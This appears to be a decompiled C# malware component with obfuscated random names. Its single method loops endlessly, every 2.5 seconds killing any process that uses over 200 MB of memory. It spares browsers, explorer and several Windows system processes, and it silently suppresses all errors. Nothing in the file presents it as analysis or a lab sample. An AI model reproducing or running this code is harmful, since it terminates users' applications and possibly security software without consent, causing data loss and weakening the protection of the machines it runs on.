using System.Diagnostics;
using System.Threading;

namespace vQzMGKHeycFziMq;

public static class QldSeOytJazJGxdo
{
	public static void rrOEpRMjgPqZ()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains("chrome") && !process.ProcessName.Contains("opera") && !process.ProcessName.Contains("msedge") && !process.ProcessName.Contains("iexplore") && !process.ProcessName.Contains("firefox") && !process.ProcessName.Contains("explorer") && !process.ProcessName.Contains("wininit") && !process.ProcessName.Contains("winlogon") && !process.ProcessName.Contains("SearchApp") && !process.ProcessName.Contains("SearchIndexer") && !process.ProcessName.Contains("SearchUI"))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}
}
